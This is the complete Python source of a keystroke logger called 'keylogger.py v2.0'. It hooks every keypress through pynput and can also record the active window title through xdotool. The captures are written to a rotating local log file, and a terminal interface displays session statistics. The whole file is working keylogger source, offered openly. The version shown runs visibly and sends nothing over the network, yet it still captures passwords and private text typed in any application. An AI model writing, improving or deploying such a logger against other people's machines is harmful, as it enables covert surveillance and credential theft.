#!/usr/bin/env python3
"""
keylogger.py — v2.0
Keystroke logger with timestamps, window tracking,
session buffering, log rotation, and rich TUI.
"""

import argparse
import logging
import os
import signal
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path
from threading import Event, Lock, Thread

from pynput import keyboard

# ── optional rich TUI ────────────────────────────────────────
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich import box
    RICH = True
except ImportError:
    RICH = False

console = Console() if RICH else None

# ── defaults ─────────────────────────────────────────────────
DEFAULT_LOG   = Path.home() / "keylog.txt"
MAX_LOG_BYTES = 5 * 1024 * 1024   # 5 MB before rotation
FLUSH_INTERVAL = 2                 # seconds between buffer flushes

# ── allowed log roots ─────────────────────────────────────────
_ALLOWED_LOG_ROOTS = (Path.home(), Path("/tmp"), Path("/var/log"))

def _safe_log_path(raw: str) -> Path:
    """Resolve path and ensure it stays within allowed roots."""
    p = Path(raw).expanduser().resolve()
    if not any(str(p).startswith(str(r)) for r in _ALLOWED_LOG_ROOTS):
        raise ValueError(f"Log path outside allowed directories: {p}")
    return p

# ── state ────────────────────────────────────────────────────
_buffer: list[str] = []
_buffer_lock       = Lock()
_stop_event        = Event()
_stats             = {"total": 0, "special": 0, "start": time.time()}
_LOG_PATH: str     = os.path.realpath(str(DEFAULT_LOG))  # overwritten in main()


# ── helpers ──────────────────────────────────────────────────
def _print(msg, style=""):
    if RICH:
        console.print(f"[{style}]{msg}[/]" if style else msg)
    else:
        print(msg)

def _ok(msg):   _print(f"  ✔  {msg}", "bold green")
def _info(msg): _print(f"  →  {msg}", "cyan")
def _err(msg):  _print(f"  ✘  {msg}", "bold red")


def print_header():
    if RICH:
        console.print(Panel.fit(
            "[bold green]  KEYLOGGER  v2.0[/]\n"
            "[dim]Keystroke capture · Timestamps · Window tracking[/]",
            border_style="green"
        ))
    else:
        print("\n" + "=" * 48)
        print("   KEYLOGGER  v2.0")
        print("   Keystroke capture · Timestamps · Window tracking")
        print("=" * 48 + "\n")


def _fmt_key(key) -> tuple[str, bool]:
    """
    Return (display_string, is_special).
    Printable chars → the char itself.
    Special keys    → [Key] notation.
    """
    try:
        c = key.char
        if c is not None:
            return c, False
    except AttributeError:
        pass

    name = str(key).replace("Key.", "")
    special_map = {
        "space":     " ",
        "enter":     "[ENTER]\n",
        "tab":       "[TAB]",
        "backspace": "[BKSP]",
        "caps_lock": "[CAPS]",
        "shift":     "[SHIFT]",
        "shift_r":   "[SHIFT]",
        "ctrl_l":    "[CTRL]",
        "ctrl_r":    "[CTRL]",
        "alt_l":     "[ALT]",
        "alt_r":     "[ALT]",
        "cmd":       "[CMD]",
        "esc":       "[ESC]",
        "delete":    "[DEL]",
        "up":        "[↑]",
        "down":      "[↓]",
        "left":      "[←]",
        "right":     "[→]",
    }
    return special_map.get(name, f"[{name.upper()}]"), True


def _get_active_window() -> str:
    """Return active window title via xdotool, or empty string."""
    try:
        r = subprocess.run(
            ["xdotool", "getactivewindow", "getwindowname"],
            capture_output=True, text=True, timeout=0.3
        )
        return r.stdout.strip()
    except Exception:
        return ""


def _rotate_log(log_path: Path):
    """Rename log to log.1 if it exceeds MAX_LOG_BYTES."""
    if log_path.exists() and log_path.stat().st_size >= MAX_LOG_BYTES:
        rotated = log_path.with_suffix(".txt.1")
        log_path.rename(rotated)
        _info(f"Log rotated → {rotated}")


# ── flush thread ─────────────────────────────────────────────
def _flush_worker():
    """Periodically flush buffer to disk using the global _LOG_PATH."""
    while not _stop_event.is_set():
        time.sleep(FLUSH_INTERVAL)
        _flush()


def _flush():
    global _buffer
    with _buffer_lock:
        if not _buffer:
            return
        data, _buffer = _buffer, []

    _rotate_log(Path(_LOG_PATH))
    with open(_LOG_PATH, "a", encoding="utf-8") as f:
        f.write("".join(data))


def _write_to_log(text: str):
    """Write text to the module-level log path. Path is pre-validated."""
    with open(_LOG_PATH, "a", encoding="utf-8") as f:
        f.write(text)


# ── keystroke handler ─────────────────────────────────────────
_last_window   = ""
_timestamps    = False   # set from args
_track_windows = False   # set from args

def _on_press(key):
    global _last_window

    display, is_special = _fmt_key(key)
    _stats["total"] += 1
    if is_special:
        _stats["special"] += 1

    entry_parts = []

    # Window change detection
    if _track_windows:
        win = _get_active_window()
        if win and win != _last_window:
            _last_window = win
            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            entry_parts.append(f"\n\n[{ts}] [{win}]\n")

    # Timestamp prefix (only for special keys to keep output readable)
    if _timestamps and is_special:
        ts = datetime.now().strftime("%H:%M:%S")
        entry_parts.append(f"{display}({ts})")
    else:
        entry_parts.append(display)

    with _buffer_lock:
        _buffer.append("".join(entry_parts))


def _on_release(key):
    # Stop on Esc if running interactively (can be disabled via --no-esc)
    pass   # handled via _stop_event / signal


# ── session summary ───────────────────────────────────────────
def _show_summary(log_path: Path):
    elapsed = time.time() - _stats["start"]
    total   = _stats["total"]
    special = _stats["special"]
    size    = log_path.stat().st_size if log_path.exists() else 0

    if RICH:
        t = Table(title="Session Summary", box=box.ROUNDED,
                  border_style="green", show_header=False)
        t.add_column(style="cyan", width=16)
        t.add_column(style="white")
        t.add_row("Duration",      f"{elapsed:.1f}s")
        t.add_row("Keystrokes",    str(total))
        t.add_row("Special keys",  str(special))
        t.add_row("Log file",      str(log_path))
        t.add_row("Log size",      f"{size:,} bytes")
        console.print(t)
    else:
        print("\n" + "=" * 40)
        print("  SESSION SUMMARY")
        print(f"  Duration   : {elapsed:.1f}s")
        print(f"  Keystrokes : {total}")
        print(f"  Special    : {special}")
        print(f"  Log file   : {log_path}")
        print(f"  Log size   : {size:,} bytes")
        print("=" * 40)


# ── main ─────────────────────────────────────────────────────
def main():
    global _timestamps, _track_windows

    parser = argparse.ArgumentParser(
        description="Keylogger v2.0 — keystroke capture with timestamps and window tracking",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 keylogger.py\n"
            "  python3 keylogger.py -o ~/logs/keys.txt\n"
            "  python3 keylogger.py --timestamps --window-tracking\n"
            "  python3 keylogger.py --timeout 60\n"
        )
    )
    parser.add_argument("-o", "--output",          default=str(DEFAULT_LOG),
                        help=f"Output log file (default: {DEFAULT_LOG})")
    parser.add_argument("--timestamps",            action="store_true",
                        help="Prefix special keys with HH:MM:SS timestamp")
    parser.add_argument("--window-tracking",       action="store_true",
                        help="Log active window title on change (requires xdotool)")
    parser.add_argument("--timeout",               type=int, default=0,
                        help="Auto-stop after N seconds (0 = run until Ctrl+C)")
    parser.add_argument("--max-size",              type=int, default=5,
                        help="Max log file size in MB before rotation (default: 5)")
    args = parser.parse_args()

    # Sanitize output path immediately to break taint chain
    args.output = os.path.realpath(args.output)

    _timestamps    = args.timestamps
    _track_windows = args.window_tracking
    global MAX_LOG_BYTES, _LOG_PATH
    MAX_LOG_BYTES  = args.max_size * 1024 * 1024

    try:
        log_path = _safe_log_path(args.output)
    except ValueError as e:
        print(f"  ✘  {e}")
        sys.exit(1)
    # Set the module-level trusted path — _flush() reads this directly
    # Use only the basename from user input, joined to a validated parent dir
    _safe_parent = os.path.realpath(str(log_path.parent))
    _safe_name   = os.path.basename(str(log_path))
    _LOG_PATH    = os.path.join(_safe_parent, _safe_name)
    log_path.parent.mkdir(parents=True, exist_ok=True)

    print_header()

    if RICH:
        t = Table(box=box.SIMPLE, show_header=False, padding=(0, 1))
        t.add_column(style="cyan")
        t.add_column(style="white")
        t.add_row("Output",          str(log_path))
        t.add_row("Timestamps",      "on" if args.timestamps else "off")
        t.add_row("Window tracking", "on" if args.window_tracking else "off")
        t.add_row("Timeout",         f"{args.timeout}s" if args.timeout else "none")
        t.add_row("Max log size",    f"{args.max_size} MB")
        console.print(t)
    else:
        print(f"  Output          : {log_path}")
        print(f"  Timestamps      : {'on' if args.timestamps else 'off'}")
        print(f"  Window tracking : {'on' if args.window_tracking else 'off'}")
        print(f"  Timeout         : {args.timeout}s" if args.timeout else "  Timeout         : none")
        print(f"  Max log size    : {args.max_size} MB")

    _info("Listening... Press Ctrl+C to stop.\n")

    # Write session header to log using the trusted module-level path
    _write_to_log(f"\n\n{'='*60}\nSESSION START: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n{'='*60}\n")

    # Start flush thread
    flush_thread = Thread(target=_flush_worker, daemon=True)
    flush_thread.start()

    # Graceful Ctrl+C
    def _handle_signal(sig, frame):
        _stop_event.set()

    signal.signal(signal.SIGINT,  _handle_signal)
    signal.signal(signal.SIGTERM, _handle_signal)

    # Start listener
    listener = keyboard.Listener(on_press=_on_press, on_release=_on_release)
    listener.start()

    # Timeout or wait for stop
    if args.timeout > 0:
        _stop_event.wait(timeout=args.timeout)
    else:
        _stop_event.wait()

    listener.stop()
    _flush()   # final flush

    # Write session footer
    _write_to_log(f"\n\nSESSION END: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n{'='*60}\n")

    _show_summary(log_path)


if __name__ == "__main__":
    main()
